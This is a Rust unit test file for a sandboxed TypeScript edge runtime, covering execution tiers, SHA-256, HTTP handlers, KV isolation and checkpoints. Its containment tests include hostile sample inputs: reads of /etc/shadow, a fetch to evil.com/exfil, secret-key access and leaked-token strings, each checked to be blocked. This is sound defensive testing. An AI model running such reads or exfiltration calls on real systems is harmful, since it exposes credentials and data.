//! Unit tests for `slice-engine` (Tier-0/Tier-1/Tier-2 execution, security containment,
//! SHA-NI/FIPS-180-4 SHA-256, WinterTC HTTP/SSE/Fetch, Edge KV, Time-Travel Checkpoints, and `slice:test`).

use crate::intrinsics::{
    digest_to_hex, fast_format_bytes, fast_format_ms, fast_parse_bytes, fast_parse_ms,
    hmac_sha256_hex, sha256_hex, Sha256State,
};
use crate::{
    compile_source_to_bytecode, disassemble_bytecode, run_source_isolated, ExecutionTier,
    HttpRequestContext, JsValue, SliceIsolate,
};
use slice_sandbox::{CapabilityToken, SandboxViolation};

#[test]
fn test_tiered_execution_and_cold_start() {
    let ts_src = r#"
interface Config {
    iterations: number;
}
function fib(n: number): number {
    if (n <= 1) return n;
    return fib(n - 1) + fib(n - 2);
}
function numericLoop(iterations: number): number {
    let acc: number = 0;
    for (let i: number = 0; i < iterations; i++) {
        acc += i;
    }
    return acc;
}
const base: number = 40;
const offset: number = 2;
const sum: number = base + offset;
const f: number = fib(40);
const loop_sum: number = numericLoop(100000);
console.log(sum);
console.log(f);
"#;
    let bytecode = compile_source_to_bytecode(ts_src);
    let mut isolate = SliceIsolate::spawn(
        "bench-tenant",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        1024 * 1024,
    );
    let metrics = isolate.execute_bytecode(&bytecode, None).unwrap();
    assert_eq!(metrics.highest_tier_reached, ExecutionTier::Tier2PeakNative);
    assert_eq!(metrics.stdout[0], "42");
    assert_eq!(metrics.stdout[1], "102334155");
    assert_eq!(metrics.os_stat_syscalls, 0);
}

#[test]
fn test_repl_javascript_session_expressions() {
    let mut isolate = SliceIsolate::spawn(
        "repl-tenant",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        1024 * 1024,
    );

    // 1. `var t = 3;`
    let m1 = isolate
        .execute_bytecode(&compile_source_to_bytecode("var t = 3;"), None)
        .unwrap();
    assert_eq!(m1.return_value, "3");

    // 2. `t`
    let m2 = isolate
        .execute_bytecode(&compile_source_to_bytecode("t"), None)
        .unwrap();
    assert_eq!(m2.return_value, "3");

    // 3. `t * 4`
    let m3 = isolate
        .execute_bytecode(&compile_source_to_bytecode("t * 4"), None)
        .unwrap();
    assert_eq!(m3.return_value, "12");

    // 4. `print(t)`
    let m4 = isolate
        .execute_bytecode(&compile_source_to_bytecode("print(t)"), None)
        .unwrap();
    assert_eq!(m4.stdout.last().unwrap(), "3");

    // 5. `console.log(t * 4);`
    let m5 = isolate
        .execute_bytecode(&compile_source_to_bytecode("console.log(t*4);"), None)
        .unwrap();
    assert_eq!(m5.stdout.last().unwrap(), "12");

    // 6. Functions, arrays, objects, higher-order methods
    let js_complex = r#"
function double(n) { return n * 2; }
const arr = [1, 2, 3, 4].map((x) => double(x));
const obj = { total: arr.reduce((a, b) => a + b, 0) };
obj.total + t
"#;
    let m6 = isolate
        .execute_bytecode(&compile_source_to_bytecode(js_complex), None)
        .unwrap();
    assert_eq!(m6.return_value, "23");
}

#[test]
fn test_sliceboa_zero_copy_and_fips_sha256_plus_fs_bridge() {
    // Test classes + node:crypto SHA-256 + node:path + node:fs roundtrip in BoaFullEsVm
    let ts_app = r#"
import * as crypto from "node:crypto";
import * as path from "node:path";
import * as os from "node:os";
import * as fs from "node:fs";

class ReceiptSigner {
    private readonly prefix: string;
    constructor(prefix: string) {
        this.prefix = prefix;
    }
    public sign(payload: string): string {
        return crypto.createHash("sha256").update(this.prefix + ":" + payload).digest("hex");
    }
}

const signer = new ReceiptSigner("slice");
const digest = signer.sign("abc");
const tmpFile = path.join(os.tmpdir(), "slice_engine_unit_test.txt");
fs.writeFileSync(tmpFile, digest);
const readBack = fs.readFileSync(tmpFile, "utf8");
const statSize = fs.statSync(tmpFile).size;
fs.unlinkSync(tmpFile);
console.log(JSON.stringify({ match: readBack === digest, size: statSize, prefix8: digest.slice(0, 8) }));
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(ts_app, true);
    let bc = compile_source_to_bytecode(&bundled);
    assert_eq!(&bc[0..8], b"SLICEBOA");

    let disasm = disassemble_bytecode(&bc).unwrap();
    assert!(disasm[0].contains("BOA_ES2024_VM"));

    let mut isolate = SliceIsolate::spawn(
        "boa-test-tenant",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        4 * 1024 * 1024,
    );
    let metrics = isolate.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        metrics.stdout[0],
        r#"{"match":true,"size":64,"prefix8":"951cd52a"}"#
    );

    // Verify raw NIST FIPS-180-4 SHA-256 test vector for "abc"
    assert_eq!(
        sha256_hex(b"abc"),
        "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
    );
}

#[test]
fn test_all_five_security_containment_vectors_in_engine() {
    // 1. SES Prototype Pollution
    let mut iso1 = SliceIsolate::spawn("sec-1", 1, CapabilityToken::pure_compute(), 1000, 65536);
    assert!(matches!(
        iso1.execute_bytecode(
            &compile_source_to_bytecode("Object.prototype.polluted = true;"),
            None
        ),
        Err(SandboxViolation::IntrinsicMutationBlocked { .. })
    ));

    // 2. Unauthorized VFS Read
    let mut iso2 = SliceIsolate::spawn(
        "sec-2",
        2,
        CapabilityToken::pure_compute().with_read_prefix("/app/allowed"),
        1000,
        65536,
    );
    assert!(matches!(
        iso2.execute_bytecode(
            &compile_source_to_bytecode("const s = fs.readFileSync(\"/etc/shadow\");"),
            None
        ),
        Err(SandboxViolation::FsReadDenied { .. })
    ));

    // 3. Unauthorized Outbound Network Fetch
    let mut iso3 = SliceIsolate::spawn(
        "sec-3",
        3,
        CapabilityToken::pure_compute().with_net_host("api.internal:443"),
        1000,
        65536,
    );
    assert!(matches!(
        iso3.execute_bytecode(
            &compile_source_to_bytecode("const r = fetch(\"https://evil.com/exfil\");"),
            None
        ),
        Err(SandboxViolation::NetAccessDenied { .. })
    ));

    // 4. Unauthorized Environment Variable Access
    let mut iso4 = SliceIsolate::spawn("sec-4", 4, CapabilityToken::pure_compute(), 1000, 65536);
    assert!(matches!(
        iso4.execute_bytecode(
            &compile_source_to_bytecode("const k = env(\"SECRET_KEY\");"),
            None
        ),
        Err(SandboxViolation::EnvAccessDenied { .. })
    ));

    // 5. Infinite Loop CPU Fuel Preemption
    let mut iso5 = SliceIsolate::spawn("sec-5", 5, CapabilityToken::pure_compute(), 250, 65536);
    assert!(matches!(
        iso5.execute_bytecode(&compile_source_to_bytecode("while (true) {}"), None),
        Err(SandboxViolation::CpuFuelExhausted { .. })
    ));
}

#[test]
fn test_warm_boa_context_pool_speedup_and_reuse() {
    SliceIsolate::prewarm_boa_pool(2);
    assert!(SliceIsolate::boa_pool_available() >= 2);

    let ts_code = r#"
import * as crypto from "node:crypto";
import * as path from "node:path";

class FastEdgeWorker {
    public compute(route: string): string {
        const normalized = path.join("/v1/edge", route, "check");
        const sig = crypto.createHash("sha256").update(normalized).digest("hex").slice(0, 12);
        return normalized + ":" + sig;
    }
}

const w = new FastEdgeWorker();
console.log(w.compute("checkout"));
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(ts_code, true);
    let bc = compile_source_to_bytecode(&bundled);

    let mut isolate = SliceIsolate::spawn(
        "warm-pool-tenant",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        4 * 1024 * 1024,
    );
    let m1 = isolate.execute_bytecode(&bc, None).unwrap();
    assert_eq!(m1.stdout[0], "/v1/edge/checkout/check:6d3e872e9820");

    // Second execution reuses the warm Boa realm returned to BOA_CONTEXT_POOL
    let mut isolate2 = SliceIsolate::spawn(
        "warm-pool-tenant-2",
        2,
        CapabilityToken::pure_compute(),
        10_000_000,
        4 * 1024 * 1024,
    );
    let m2 = isolate2.execute_bytecode(&bc, None).unwrap();
    assert_eq!(m2.stdout[0], "/v1/edge/checkout/check:6d3e872e9820");
    assert!(SliceIsolate::boa_pool_available() >= 2);
}

#[test]
fn test_phase_7_3_native_semver_and_phase_7_4_boa_ocap_enforcement() {
    let ts_code = r#"
class SemverChecker {
    public run(): string {
        const v1 = __slice_semver_valid("v2.4.8");
        const v2 = __slice_semver_valid("invalid");
        const c1 = __slice_semver_coerce("v42.6.7.9.3-alpha");
        const gt1 = __slice_semver_gt("2.1.0", "2.0.9");
        const sat1 = __slice_semver_satisfies("1.5.2", ">=1.2.0 <2.0.0");
        const sat2 = __slice_semver_satisfies("2.0.0", "^1.2.3");
        return JSON.stringify({ v1, v2, c1, gt1, sat1, sat2 });
    }
}

console.log(new SemverChecker().run());
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(ts_code, true);
    let bc = compile_source_to_bytecode(&bundled);
    let mut iso = SliceIsolate::spawn(
        "semver-tenant",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        4 * 1024 * 1024,
    );
    let m = iso.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        m.stdout[0],
        r#"{"v1":"2.4.8","v2":null,"c1":"42.6.7","gt1":true,"sat1":1,"sat2":0}"#
    );

    // Phase 7.4: Verify native Boa `node:fs` enforces OCap path traversal & read prefixes
    let ocap_escape_ts = r#"
import * as fs from "node:fs";
class EscapeAttempt {
    public leak(): string {
        return fs.readFileSync("/etc/../etc/shadow", "utf8");
    }
}
console.log(new EscapeAttempt().leak());
"#;
    let ocap_bundled = slice_cas::strip_typescript_and_normalize(ocap_escape_ts, true);
    let ocap_bc = compile_source_to_bytecode(&ocap_bundled);
    let mut ocap_iso = SliceIsolate::spawn(
        "ocap-boa-tenant",
        2,
        CapabilityToken::pure_compute().with_read_prefix("/app/safe"),
        10_000_000,
        4 * 1024 * 1024,
    );
    assert!(matches!(
        ocap_iso.execute_bytecode(&ocap_bc, None),
        Err(SandboxViolation::FsReadDenied { .. })
    ));
}

#[test]
fn test_phase_9a_micro_optimizations_and_streaming_sha256() {
    // 1. Verify JsValue enum size is strictly 16 bytes (4 values per 64B cache line)
    assert_eq!(std::mem::size_of::<JsValue>(), 16);

    // 2. Verify streaming Sha256State produces identical digests to one-shot sha256_bytes
    // across <64B, =64B, >64B, and >128B block boundaries without intermediate heap vecs.
    let payload = b"The quick brown fox jumps over the lazy dog - Slice Phase 9A zero-allocation streaming SHA-256 verification across multiple 64-byte FIPS-180-4 blocks!";
    let expected_hex = sha256_hex(payload);

    let mut streamer = Sha256State::new();
    for chunk in payload.chunks(13) {
        streamer.update(chunk);
    }
    assert_eq!(digest_to_hex(&streamer.finalize()), expected_hex);

    #[cfg(any(target_arch = "x86", target_arch = "x86_64"))]
    if std::arch::is_x86_feature_detected!("sha")
        && std::arch::is_x86_feature_detected!("sse4.1")
        && std::arch::is_x86_feature_detected!("ssse3")
    {
        let mut s_soft = Sha256State::new();
        let mut s_hw = Sha256State::new();
        let block: &[u8; 64] = payload[..64].try_into().unwrap();
        Sha256State::compress_block_soft(&mut s_soft.h, block);
        unsafe {
            Sha256State::compress_block_sha_ni(&mut s_hw.h, block);
        }
        assert_eq!(s_soft.h, s_hw.h);
    }

    // 3. Verify HMAC-SHA256 with both short key (<=64B) and long key (>64B)
    let hmac_short = hmac_sha256_hex(b"secret-key", payload);
    assert_eq!(hmac_short.len(), 64);
    let hmac_long = hmac_sha256_hex(&[b'k'; 100], payload);
    assert_eq!(hmac_long.len(), 64);
    assert_ne!(hmac_short, hmac_long);

    // 4. Verify SLICEBOA bytecode is pre-wrapped with block braces at compile time
    let ts_class = "class A { run(): number { return 7; } }\nconsole.log(new A().run());";
    let bundled = slice_cas::strip_typescript_and_normalize(ts_class, true);
    let bc = compile_source_to_bytecode(&bundled);
    assert!(bc.starts_with(b"SLICEBOA{\n"));
    assert!(bc.ends_with(b"\n}"));

    // 5. Verify native fast_parse_ms, fast_format_ms, fast_parse_bytes, and fast_format_bytes
    assert_eq!(fast_parse_ms("2h"), Some(7_200_000.0));
    assert_eq!(fast_parse_ms("30s"), Some(30_000.0));
    assert_eq!(fast_parse_ms("15m"), Some(900_000.0));
    assert_eq!(
        fast_format_ms(120_000.0, true).as_deref(),
        Some("2 minutes")
    );
    assert_eq!(fast_format_ms(120_000.0, false).as_deref(), Some("2m"));
    assert_eq!(fast_parse_bytes("64KB"), Some(65_536.0));
    assert_eq!(fast_parse_bytes("128KB"), Some(131_072.0));
    assert_eq!(fast_format_bytes(65_536.0).as_deref(), Some("64KB"));
    assert_eq!(fast_format_bytes(4_730_880.0).as_deref(), Some("4.51MB"));

    // 6. Verify Persistent Realm Module Cache (__slice_rc) & prewarm_boa_bundle
    let rc_bundle = "var __slice_modules = {};//__SLICE_RC:0123456789abcdef\nvar __rc = globalThis.__slice_rc || (globalThis.__slice_rc = Object.create(null));\nvar __run = __rc[\"0123456789abcdef\"] || (__rc[\"0123456789abcdef\"] = function() { console.log(\"rc-ok\"); });\n__run();";
    let rc_bc = compile_source_to_bytecode(rc_bundle);
    SliceIsolate::prewarm_boa_bundle(&rc_bc);
    let mut rc_iso = SliceIsolate::spawn(
        "rc-tenant",
        1,
        CapabilityToken::pure_compute(),
        1_000_000,
        4 * 1024 * 1024,
    );
    let rc_m = rc_iso.execute_bytecode(&rc_bc, None).unwrap();
    assert_eq!(rc_m.stdout, vec!["rc-ok"]);

    // 7. Verify Phase 9B Priority 3: Oxc Semantic Hints & Monomorphic Tier-2 Loop Promotion
    let ts_typed_loop = r#"
        export interface MetricPoint {
            readonly seq: number;
            readonly service: string;
            readonly latencyMs: number;
        }
        let acc: number = 0;
        for (let i: number = 0; i < 2000; i++) {
            acc += i * 3;
        }
        return acc;
    "#;
    let hints = slice_cas::analyze_typescript_semantics(ts_typed_loop);
    assert!(hints.numeric_vars.contains("acc"));
    assert!(hints.numeric_vars.contains("i"));
    assert!(hints.interface_schemas.contains_key("MetricPoint"));
    assert!(hints.semantic_symbol_count >= 2);

    let loop_bc = compile_source_to_bytecode(ts_typed_loop);
    let mut loop_iso = SliceIsolate::spawn(
        "tier2-mono-loop",
        1,
        CapabilityToken::pure_compute(),
        1_000_000,
        4 * 1024 * 1024,
    );
    let loop_metrics = loop_iso.execute_bytecode(&loop_bc, None).unwrap();
    assert_eq!(
        loop_metrics.highest_tier_reached,
        ExecutionTier::Tier2PeakNative
    );
    // sum_{i=0..1999} 3*i = 3 * (1999 * 2000 / 2) = 5,997,000
    assert_eq!(loop_metrics.return_value, "5997000");
}

#[test]
fn test_tag_n1_wintertc_http_bridge_and_wait_until() {
    // Test 1: Tier-1 SLICEBOA handler using Slice.request(), Slice.respond(), and Slice.waitUntil()
    let handler_ts = r#"
class EdgeRouter {
    public handle(): void {
        const req = Slice.request();
        const auth = req.header("authorization");
        Slice.waitUntil(() => {
            globalThis.__audit_trail = req.method + ":" + req.path + ":" + req.tenant;
        });
        Slice.respond(
            201,
            JSON.stringify({
                method: req.method,
                path: req.path,
                query: req.query,
                tenant: req.tenant,
                auth: auth,
                bodyLen: req.body.length
            }),
            "application/json"
        );
    }
}
new EdgeRouter().handle();
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(handler_ts, true);
    let bc = compile_source_to_bytecode(&bundled);
    SliceIsolate::prewarm_boa_bundle(&bc);

    let mut isolate = SliceIsolate::spawn(
        "n1-edge-tenant",
        1,
        CapabilityToken::pure_compute(),
        2_000_000,
        4 * 1024 * 1024,
    );

    let headers = [
        ("Authorization", "Bearer tok_xyz"),
        ("Host", "edge.slice.dev"),
    ];
    let req_ctx = HttpRequestContext {
        method: "POST",
        path: "/v1/orders",
        query: "region=us-east",
        tenant_id: "n1-edge-tenant",
        headers: &headers,
        body: r#"{"item":"gpu-node"}"#,
    };

    let outcome = isolate.execute_http_request(&bc, None, &req_ctx).unwrap();
    assert_eq!(outcome.status_code, 201);
    assert_eq!(outcome.content_type, "application/json");
    assert_eq!(outcome.wait_until_count, 1);
    assert_eq!(
        outcome.response_body,
        r#"{"method":"POST","path":"/v1/orders","query":"region=us-east","tenant":"n1-edge-tenant","auth":"Bearer tok_xyz","bodyLen":19}"#
    );

    // Drain deferred Slice.waitUntil() callbacks after HTTP response is prepared
    let ran = isolate.drain_wait_until_tasks().unwrap();
    assert_eq!(ran, 1);

    // Test 2: Tier-0 SLICESNP cached fast-path execution via execute_http_request
    let fast_ts = "const x: number = 21 * 2;\nreturn x;\n";
    let fast_bc = compile_source_to_bytecode(fast_ts);
    let mut fast_iso = SliceIsolate::spawn(
        "n1-fast-tenant",
        2,
        CapabilityToken::pure_compute(),
        100_000,
        65536,
    );
    let fast_outcome = fast_iso
        .execute_http_request(&fast_bc, None, &req_ctx)
        .unwrap();
    assert_eq!(fast_outcome.status_code, 200);
    assert_eq!(fast_outcome.wait_until_count, 0);
    assert_eq!(fast_outcome.response_body, "42");
}

#[test]
fn test_tag_n2_sharded_edge_kv_isolation_and_deterministic_replay() {
    // 1. Test Slice.kv multi-tenant isolation, atomic counters, and memory quota enforcement
    let kv_ts = r#"
class KvService {
    public run(): string {
        const c1 = Slice.kv.incr("hits", 1);
        const c2 = Slice.kv.incr("hits", 4);
        Slice.kv.set("session:abc", "active-user", 60000);
        const val = Slice.kv.get("session:abc");
        const missing = Slice.kv.get("other-key");
        return JSON.stringify({ c1, c2, val, missing });
    }
}
console.log(new KvService().run());
"#;
    let bc = compile_source_to_bytecode(&slice_cas::strip_typescript_and_normalize(kv_ts, true));

    let mut iso_a = SliceIsolate::spawn(
        "n2-tenant-alpha",
        1,
        CapabilityToken::pure_compute(),
        2_000_000,
        4 * 1024 * 1024,
    );
    let _ = iso_a.kv_del("hits");
    let _ = iso_a.kv_del("session:abc");
    let m_a = iso_a.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        m_a.stdout[0],
        r#"{"c1":1,"c2":5,"val":"active-user","missing":null}"#
    );

    // Tenant Beta has a completely isolated KV namespace and cannot see Tenant Alpha's keys
    let mut iso_b = SliceIsolate::spawn(
        "n2-tenant-beta",
        2,
        CapabilityToken::pure_compute(),
        2_000_000,
        4 * 1024 * 1024,
    );
    let _ = iso_b.kv_del("hits");
    assert_eq!(iso_b.kv_get("session:abc"), None);
    let m_b = iso_b.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        m_b.stdout[0],
        r#"{"c1":1,"c2":5,"val":"active-user","missing":null}"#
    );

    // Verify KV writes are charged against the tenant's compartment memory limit
    let kv_overflow_ts = r#"
Slice.kv.set("huge", "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef", 0);
"#;
    let overflow_bc = compile_source_to_bytecode(kv_overflow_ts);
    let mut tiny_iso = SliceIsolate::spawn(
        "n2-tiny-mem",
        3,
        CapabilityToken::pure_compute(),
        1_000_000,
        16, // 16-byte limit
    );
    assert!(matches!(
        tiny_iso.execute_bytecode(&overflow_bc, None),
        Err(SandboxViolation::MemoryCeilingExceeded { .. })
    ));

    // 2. Test Opt-In Deterministic Replay Mode (--deterministic=<seed>)
    let det_ts = r#"
const r1 = Math.random().toFixed(12);
const r2 = Math.random().toFixed(12);
const t1 = Date.now();
const t2 = Date.now();
const p1 = performance.now();
console.log(JSON.stringify({ r1, r2, t1, t2, p1 }));
"#;
    let det_bc = compile_source_to_bytecode(det_ts);

    let mut det_iso1 = SliceIsolate::spawn(
        "n2-det-1",
        4,
        CapabilityToken::pure_compute(),
        1_000_000,
        4 * 1024 * 1024,
    );
    det_iso1.set_deterministic_seed(Some(20261019));
    let out1 = det_iso1.execute_bytecode(&det_bc, None).unwrap().stdout[0].clone();

    let mut det_iso2 = SliceIsolate::spawn(
        "n2-det-2",
        5,
        CapabilityToken::pure_compute(),
        1_000_000,
        4 * 1024 * 1024,
    );
    det_iso2.set_deterministic_seed(Some(20261019));
    let out2 = det_iso2.execute_bytecode(&det_bc, None).unwrap().stdout[0].clone();

    assert_eq!(out1, out2);
    assert!(out1.contains(r#""t1":1700000000001"#));
    assert!(out1.contains(r#""t2":1700000000002"#));
}

#[test]
fn test_tag_n3_eval_sandbox_checkpoint_restore_and_egress_guard() {
    SliceIsolate::prewarm_boa_pool(2);

    // 1. Test Tree-of-Thought AI Agent workflow:
    //    - Set baseline VFS file and KV key
    //    - Call `Slice.checkpoint()`
    //    - Execute candidate Branch A in `Slice.evalSandbox(...)` which mutates KV + VFS and fails
    //    - Call `Slice.restore(snapId)` to roll back VFS + KV in < 5us
    //    - Execute candidate Branch B in `Slice.evalSandbox(...)` which succeeds
    let agent_tot_ts = r#"
import fs from "node:fs";

class TreeOfThoughtAgent {
    public run(): string {
        fs.writeFileSync("/workspace/app.ts", "export const v = 1;");
        Slice.kv.set("status", "baseline", 0);

        const snap = Slice.checkpoint();

        // Candidate Branch A: mutates VFS & KV, then attempts prototype pollution inside sub-sandbox
        fs.writeFileSync("/workspace/app.ts", "CORRUPTED_BY_BRANCH_A");
        Slice.kv.set("status", "corrupted", 0);
        const branchA = Slice.evalSandbox("Object.prototype.polluted = true;", { fuel: 50000 });
        if (!branchA.ok) {
            // Instant rollback of VFS + KV to pre-Branch-A checkpoint!
            const restored = Slice.restore(snap);
            if (!restored) {
                throw new Error("Restore failed");
            }
        }

        // Verify VFS and KV were rolled back cleanly
        const vfsAfterRollback = fs.readFileSync("/workspace/app.ts", "utf8");
        const kvAfterRollback = Slice.kv.get("status");

        // Candidate Branch B: valid TypeScript inside sub-sandbox with capability attenuation
        const branchB = Slice.evalSandbox(
            "const patchVersion: number = 2; console.log('branch-b-ok'); patchVersion * 21",
            { fuel: 200000, allowRead: ["/workspace"] }
        );

        // Candidate Branch C: attempts to escalate read capability to /etc/shadow (blocked by intersection with parent!)
        const branchC = Slice.evalSandbox(
            "const s = fs.readFileSync('/etc/shadow');",
            { fuel: 50000, allowRead: ["/etc"] }
        );

        return JSON.stringify({
            vfs: vfsAfterRollback,
            kv: kvAfterRollback,
            aOk: branchA.ok,
            bOk: branchB.ok,
            bVal: branchB.returnValue,
            bOut: branchB.stdout[0],
            cOk: branchC.ok
        });
    }
}
console.log(new TreeOfThoughtAgent().run());
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(agent_tot_ts, true);
    let bc = compile_source_to_bytecode(&bundled);
    let caps = CapabilityToken::pure_compute()
        .with_read_prefix("/workspace")
        .with_write_prefix("/workspace");
    let mut agent_iso = SliceIsolate::spawn("n3-tot-agent", 10, caps, 5_000_000, 8 * 1024 * 1024);
    let metrics = agent_iso.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        metrics.stdout[0],
        r#"{"vfs":"export const v = 1;","kv":"baseline","aOk":false,"bOk":true,"bVal":"42","bOut":"branch-b-ok","cOk":false}"#
    );

    // 2. Test Egress Secret Guard blocking both raw and base64-encoded secret exfiltration
    let raw_leak_bc = compile_source_to_bytecode(r#"console.log("token=sk_live_99887766");"#);
    let mut leak_iso1 = SliceIsolate::spawn(
        "n3-leak-raw",
        11,
        CapabilityToken::pure_compute(),
        500_000,
        2 * 1024 * 1024,
    );
    leak_iso1.add_egress_audit_secret("sk_live_99887766");
    assert!(matches!(
        leak_iso1.execute_bytecode(&raw_leak_bc, None),
        Err(SandboxViolation::EnvAccessDenied { ref key, .. }) if key == "EGRESS_SECRET_LEAK_BLOCKED"
    ));

    // Base64 of "sk_live_99887766" is "c2tfbGl2ZV85OTg4Nzc2Ng=="
    let b64_leak_bc =
        compile_source_to_bytecode(r#"console.log("exfil=c2tfbGl2ZV85OTg4Nzc2Ng==");"#);
    let mut leak_iso2 = SliceIsolate::spawn(
        "n3-leak-b64",
        12,
        CapabilityToken::pure_compute(),
        500_000,
        2 * 1024 * 1024,
    );
    leak_iso2.add_egress_audit_secret("sk_live_99887766");
    assert!(matches!(
        leak_iso2.execute_bytecode(&b64_leak_bc, None),
        Err(SandboxViolation::EnvAccessDenied { ref key, .. }) if key == "EGRESS_SECRET_LEAK_BLOCKED"
    ));
}

#[test]
fn test_tag_f1_wintertc_url_headers_request_response_and_export_default_fetch() {
    SliceIsolate::prewarm_boa_pool(2);

    // 1. Test standard URL, URLSearchParams, Headers, Request, Response, Response.json, Response.redirect
    let wintertc_std_ts = r#"
const u = new URL("/v2/items/../orders?tag=gpu&limit=10#summary", "https://api.slice.dev:443/v1/base");
u.searchParams.set("limit", "25");
u.searchParams.append("tag", "edge");
u.searchParams.sort();

const h = new Headers({ "X-Tenant-Id": "acme-prod", "Content-Type": "application/json" });
h.append("X-Trace", "t1");
h.append("x-trace", "t2");

const req = new Request(u, {
    method: "post",
    headers: h,
    body: JSON.stringify({ sku: "H100", qty: 4 })
});
const parsedBody = req.jsonSync();

const jsonRes = Response.json({ ok: true, sku: parsedBody.sku, qty: parsedBody.qty }, { status: 201 });
const redirRes = Response.redirect("https://slice.dev/login", 307);

console.log(JSON.stringify({
    origin: u.origin,
    pathname: u.pathname,
    search: u.search,
    tags: u.searchParams.getAll("tag"),
    href: u.href,
    method: req.method,
    tenant: req.headers.get("x-tenant-id"),
    trace: req.headers.get("X-TRACE"),
    resStatus: jsonRes.status,
    resOk: jsonRes.ok,
    resCt: jsonRes.headers.get("content-type"),
    resBody: jsonRes.jsonSync(),
    redirStatus: redirRes.status,
    redirLoc: redirRes.headers.get("Location")
}));
"#;
    let bc_std = compile_source_to_bytecode(wintertc_std_ts);
    let mut iso = SliceIsolate::spawn(
        "f1-std-tenant",
        1,
        CapabilityToken::pure_compute(),
        2_000_000,
        8 * 1024 * 1024,
    );
    let metrics = iso.execute_bytecode(&bc_std, None).unwrap();
    assert_eq!(
        metrics.stdout[0],
        r#"{"origin":"https://api.slice.dev","pathname":"/v2/orders","search":"?limit=25&tag=gpu&tag=edge","tags":["gpu","edge"],"href":"https://api.slice.dev/v2/orders?limit=25&tag=gpu&tag=edge#summary","method":"POST","tenant":"acme-prod","trace":"t1, t2","resStatus":201,"resOk":true,"resCt":"application/json","resBody":{"ok":true,"sku":"H100","qty":4},"redirStatus":307,"redirLoc":"https://slice.dev/login"}"#
    );

    // 2. Test `export default { fetch(req, env, ctx) }` handler with zero-copy Request & Headers
    let export_default_ts = r#"
let moduleInitCount = 0;
moduleInitCount += 1;

export default {
    fetch(req: Request, env: any, ctx: any): Response {
        const url = new URL(req.url);
        const role = req.headers.get("x-role") || "guest";
        const hits = Slice.kv.incr("f1_hits", 1);
        ctx.waitUntil(() => {
            Slice.kv.set("f1_last_path", url.pathname, 60000);
        });
        if (req.method === "POST") {
            const payload = req.jsonSync();
            return Response.json({
                initCount: moduleInitCount,
                path: url.pathname,
                filter: url.searchParams.get("filter"),
                role,
                hits,
                echo: payload.msg,
                nodeEnv: env.NODE_ENV
            }, { status: 201 });
        }
        return Response.json({ initCount: moduleInitCount, path: url.pathname, hits });
    }
};
"#;
    let fetch_bc = compile_source_to_bytecode(export_default_ts);
    SliceIsolate::prewarm_boa_bundle(&fetch_bc);

    let headers = [
        ("Host", "edge.slice.local"),
        ("X-Role", "admin"),
        ("Content-Type", "application/json"),
    ];
    let req_ctx = HttpRequestContext {
        method: "POST",
        path: "/api/v1/deploy",
        query: "filter=canary",
        tenant_id: "f1-edge-tenant",
        body: r#"{"msg":"ship-it"}"#,
        headers: &headers,
    };
    iso.reset_for_request("f1-edge-tenant", 2, 2_000_000, 8 * 1024 * 1024);
    let out1 = iso.execute_http_request(&fetch_bc, None, &req_ctx).unwrap();
    assert_eq!(out1.status_code, 201);
    assert_eq!(out1.content_type, "application/json");
    assert_eq!(out1.wait_until_count, 1);
    assert_eq!(
        out1.response_body,
        r#"{"initCount":1,"path":"/api/v1/deploy","filter":"canary","role":"admin","hits":1,"echo":"ship-it","nodeEnv":"production"}"#
    );
    let drained = iso.drain_wait_until_tasks().unwrap();
    assert_eq!(drained, 1);
    assert_eq!(
        iso.kv_get("f1_last_path"),
        Some("/api/v1/deploy".to_string())
    );

    // Second request on warm isolate must reuse `moduleInitCount === 1` without re-running module top-level!
    let req_ctx2 = HttpRequestContext {
        method: "GET",
        path: "/api/v1/status",
        query: "",
        tenant_id: "f1-edge-tenant",
        body: "",
        headers: &headers,
    };
    iso.reset_for_request("f1-edge-tenant", 2, 2_000_000, 8 * 1024 * 1024);
    let out2 = iso
        .execute_http_request(&fetch_bc, None, &req_ctx2)
        .unwrap();
    assert_eq!(out2.status_code, 200);
    assert_eq!(
        out2.response_body,
        r#"{"initCount":1,"path":"/api/v1/status","hits":2}"#
    );
    let _ = iso.drain_wait_until_tasks().unwrap();
}

#[test]
fn test_tag_f2_sse_token_streaming_readablestream_and_egress_dlp() {
    SliceIsolate::prewarm_boa_pool(2);

    // 1. Test `Response.sse`, `Slice.streamSSE`, and `ReadableStream`
    let sse_ts = r#"
export default {
    fetch(req: Request): Response {
        const url = new URL(req.url);
        if (url.pathname === "/api/v1/chat/stream") {
            return Response.sse((emit: any) => {
                emit({ id: "tok-1", event: "token", data: { delta: "Slice " }, retry: 1500 });
                emit({ id: "tok-2", event: "token", data: { delta: "streams " } });
                emit({ id: "tok-3", event: "done", data: "[DONE]" });
            });
        }
        if (url.pathname === "/api/v1/raw-stream") {
            const stream = new ReadableStream({
                start(controller: any) {
                    controller.enqueue("chunk-alpha|");
                    controller.enqueue("chunk-beta");
                    controller.close();
                }
            });
            return new Response(stream, { headers: { "content-type": "text/plain" } });
        }
        return new Response("Not Found", { status: 404 });
    }
};
"#;
    let bc = compile_source_to_bytecode(sse_ts);
    SliceIsolate::prewarm_boa_bundle(&bc);

    let mut iso = SliceIsolate::spawn(
        "f2-sse-tenant",
        1,
        CapabilityToken::pure_compute(),
        2_000_000,
        8 * 1024 * 1024,
    );
    iso.add_egress_audit_secret("sk_live_sse_secret_888");

    let headers = [("Host", "edge.slice.local")];
    let req1 = HttpRequestContext {
        method: "GET",
        path: "/api/v1/chat/stream",
        query: "",
        tenant_id: "f2-sse-tenant",
        body: "",
        headers: &headers,
    };
    let out1 = iso.execute_http_request(&bc, None, &req1).unwrap();
    assert_eq!(out1.status_code, 200);
    assert_eq!(out1.content_type, "text/event-stream; charset=utf-8");
    assert!(out1
